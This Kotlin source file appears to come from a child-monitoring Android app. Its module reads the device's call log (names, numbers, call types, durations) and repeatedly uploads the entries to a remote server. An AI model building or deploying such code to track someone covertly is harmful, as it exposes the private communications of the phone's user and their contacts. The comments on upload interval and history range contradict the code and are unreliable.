package com.example.kidsguardchild.modules

import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.util.Log
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.CallLogBody
import com.example.kidsguardchild.core.DataUploader
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

private const val TAG = "CallLogModule"

/**
 * Reads call log metadata (number, type, duration, contact name) and uploads
 * entries from the last 30 minutes every 30 minutes.
 *
 * METADATA ONLY — no call recording. Requires READ_CALL_LOG permission.
 */
class CallLogModule(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null
    private var lastUploadTime = System.currentTimeMillis() - TimeUnit.MINUTES.toMillis(30)

    fun start() {
        job = scope.launch {
            syncHistorical()
            while (isActive) {
                uploadNewCallLogs()
                lastUploadTime = System.currentTimeMillis()
                delay(TimeUnit.MINUTES.toMillis(3))
            }
        }
        Log.d(TAG, "CallLog module started")
    }

    /** Upload existing call history (last 90 days, up to 200 entries). */
    suspend fun syncHistorical() {
        uploadCallLogsSince(0, 200)
        Log.i(TAG, "Historical call log sync done")
    }

    fun stop() {
        job?.cancel()
        Log.d(TAG, "CallLog module stopped")
    }

    private suspend fun uploadNewCallLogs() {
        uploadCallLogsSince(lastUploadTime, 50)
    }

    private suspend fun uploadCallLogsSince(sinceMs: Long, max: Int) {
        val projection = arrayOf(
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )
        val selection = if (sinceMs > 0) "${CallLog.Calls.DATE} > ?" else null
        val selectionArgs = if (sinceMs > 0) arrayOf(sinceMs.toString()) else null

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                "${CallLog.Calls.DATE} DESC LIMIT $max"
            )

            cursor?.use { c ->
                var count = 0
                while (c.moveToNext() && count < max) {
                    count++
                    val name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                    val number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val typeInt = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val durationSec = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))

                    val type = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        else -> "Unknown"
                    }
                    val duration = formatDuration(durationSec)

                    DataUploader.upload("CallLog[$name]") {
                        ApiClient.service.postCallLog(
                            CallLogBody(contact = name, number = number, type = type, duration = duration)
                        )
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading call logs: ${e.message}")
        } finally {
            cursor?.close()
        }
    }

    private fun formatDuration(seconds: Long): String {
        val m = seconds / 60
        val s = seconds % 60
        return "%02d:%02d".format(m, s)
    }
}
